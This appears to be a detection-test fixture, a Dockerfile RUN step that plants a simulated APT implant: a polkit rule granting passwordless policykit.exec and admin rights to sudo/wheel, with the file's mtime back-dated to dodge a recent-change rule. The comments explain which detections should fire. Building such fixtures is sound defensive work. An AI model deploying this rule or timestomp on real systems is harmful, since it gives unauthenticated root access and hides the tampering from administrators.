# APT implant: apt-polkit-yes-timestomp (polkit privilege rule, mtime back-dated)
#
# Real shape (T1548): a polkit rules.d JS rule that returns Result.YES for
# policykit.exec and an addAdminRule granting wheel/sudo, then touch -d to
# back-date mtime and defeat the polkit rules' recent_mtime_7d gate. ctime
# cannot be moved back, so recent_ctime_7d still fires -> the polkit rules
# (now consuming recent_ctime_7d) catch the timestomp bypass. The drop-in
# is NOT package-owned, so package_file_tampered is silent and the
# tamper-gated timestomp rule correctly does NOT fire here.
#
# Variables: ${rules_file}, ${fake_date}

RUN mkdir -p /etc/polkit-1/rules.d && \
    printf '%s\n' \
        'polkit.addAdminRule(function(action, subject) {' \
        '    return ["unix-group:sudo", "unix-group:wheel"];' \
        '});' \
        'polkit.addRule(function(action, subject) {' \
        '    if (action.id.indexOf("org.freedesktop.policykit.exec") == 0) {' \
        '        return polkit.Result.YES;' \
        '    }' \
        '});' \
        > ${rules_file} && \
    chown root:root ${rules_file} && \
    chmod 0644 ${rules_file} && \
    touch -d '${fake_date}' ${rules_file}
